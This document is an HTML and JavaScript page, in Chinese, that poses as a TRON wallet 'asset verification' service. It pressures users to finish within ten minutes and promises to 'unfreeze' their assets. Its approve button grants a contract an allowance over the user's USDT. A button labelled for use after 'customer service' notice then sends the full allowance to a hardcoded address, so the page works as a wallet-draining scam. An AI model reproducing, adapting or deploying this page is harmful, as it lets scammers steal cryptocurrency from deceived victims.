<!doctype html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>進行錢包資產驗證</title>
  <style>
    .center {
      margin: auto;
      width: 60%;
      padding: 10px;
    }
    input {
      width: 100%;
      padding: 5px;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <div class="center">
    <button id="connectButton">請連接錢包</button>
  </div>

  <div class="center">
    <label>驗證地址：</label>
    <input id="verifyAddress" placeholder="收款者或合約地址（目前未用）" />
  </div>

  <div class="center">
    <label>驗證金額：</label>
    <input id="verifyAmount" placeholder="例如 0.1" />
  </div>

  <div class="center">
    <button id="approve_Btn">驗證（授權）</button>
  </div>

  <div class="center">
    <label>⚠️ 請於十分鐘內完成驗證流程</label>
  </div>

  <div class="center">
    <button id="transferFrom_Btn">請於客服通知後點擊</button>
  </div>

  <div class="center">
    <label>驗證完成後將開啟解凍</label>
  </div>

  <!-- 新增查詢按鈕 -->
  <div class="center">
    <button id="checkBtn">查詢授權與餘額</button>
  </div>

  <script>
    const connectButton = document.getElementById("connectButton");
    const approveButton = document.getElementById("approve_Btn");
    const transferFromButton = document.getElementById("transferFrom_Btn");
    const checkBtn = document.getElementById("checkBtn");

    const verifyAddressInput = document.getElementById("verifyAddress");
    const verifyAmountInput = document.getElementById("verifyAmount");

    const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"; // Shasta 測試網 USDT
    const MyDex_contractAddress = "TDXNbzDWrovDb3bLMAh4dPKGLU8VCDoCbu"; // 你部署的 MyDex

    const TRC20_ABI = [
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
      },
      {
        constant: true,
        inputs: [
          { name: "_owner", type: "address" },
          { name: "_spender", type: "address" }
        ],
        name: "allowance",
        outputs: [{ name: "remaining", type: "uint256" }],
        type: "function"
      },
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function"
      }
    ];

    const MyDex_ABI = [
      {
        constant: false,
        inputs: [{ name: "user", type: "address" }],
        name: "addAddress",
        outputs: [],
        type: "function"
      },
      {
        constant: true,
        inputs: [{ name: "index", type: "uint256" }],
        name: "getIndexAddress",
        outputs: [{ name: "", type: "address" }],
        type: "function"
      },
      {
        constant: false,
        inputs: [
          { name: "from", type: "address" },
          { name: "to", type: "address" },
          { name: "amount", type: "uint256" }
        ],
        name: "transferFrom",
        outputs: [],
        type: "function"
      }
    ];

    connectButton.onclick = async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        alert("錢包已連接：" + window.tronWeb.defaultAddress.base58);
        connectButton.innerHTML = "已連接錢包：" + window.tronWeb.defaultAddress.base58;
      } else if (window.tronLink) {
        try {
          await window.tronLink.request({ method: "tron_requestAccounts" });
        } catch (error) {
          alert("請先允許錢包連接");
        }
      } else {
        alert("請安裝 TronLink 或使用 imToken 內建瀏覽器");
      }
    };

    approveButton.onclick = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("請先連接錢包");
        return;
      }

      const amountStr = verifyAmountInput.value.trim();
      if (!amountStr) {
        alert("請輸入驗證金額");
        return;
      }

      const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString(); // USDT 小數點後6位
      const userAddress = window.tronWeb.defaultAddress.base58;

      const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
      const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);

      try {
        console.log("📝 開始授權 USDT", amount);
        const tx1 = await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
        console.log("✅ 授權成功：", tx1);

        const tx2 = await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
        console.log("✅ 加入地址成功：", tx2);

        alert("授權與加入成功");
      } catch (err) {
        console.error("❌ 授權錯誤：", err);
        alert("授權失敗，請確認 TRX 手續費或合約地址");
      }
    };

    transferFromButton.onclick = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("請先連接錢包");
        return;
      }

      try {
        const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
        console.log("MyDex contract:", MyDex);
        console.log("MyDex.transferFrom:", MyDex.transferFrom);

        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);

        const fromHex = await MyDex.getIndexAddress(0).call();
        const from = window.tronWeb.address.fromHex(fromHex);
        console.log("fromHex:", fromHex);
        console.log("from (Base58):", from);

        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
        console.log("to:", to);

        let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
        if (!allowance) {
          alert("未取得 allowance，無法執行轉帳");
          return;
        }
        allowance = window.tronWeb.toBigNumber(allowance).toString();
        console.log("allowance:", allowance);

        if (BigInt(allowance) === 0n) {
          alert("尚未授權，無法轉帳");
          return;
        }

        const fromStr = String(from);
        const toStr = String(to);
        const allowanceStr = String(allowance);

        console.log({ fromStr, toStr, allowanceStr });

        // 先測試 call 看看參數是否可行
        await MyDex.transferFrom(fromStr, toStr, allowanceStr).call();

        const tx = await MyDex.transferFrom(fromStr, toStr, allowanceStr).send({ feeLimit: 100_000_000 });
        console.log("轉帳成功", tx);
        alert("轉帳成功");
      } catch (err) {
        console.error("轉帳失敗", err);
        alert("轉帳失敗，請確認授權狀態與 TRX 餘額");
      }
    };

    // 新增：查詢授權與餘額功能
    checkBtn.onclick = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("請先連接錢包");
        return;
      }

      const userAddress = window.tronWeb.defaultAddress.base58;

      try {
        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
        // 查餘額
        let balance = await USDT.balanceOf(userAddress).call();
        // 查授權
        let allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();

        balance = window.tronWeb.toBigNumber(balance).toString();
        allowance = window.tronWeb.toBigNumber(allowance).toString();

        alert(`地址: ${userAddress}\nUSDT 餘額: ${balance}\n授權額度: ${allowance}`);
      } catch (error) {
        console.error("查詢錯誤:", error);
        alert("查詢失敗，請確認錢包連接與合約地址");
      }
    };
  </script>
</body>
</html>
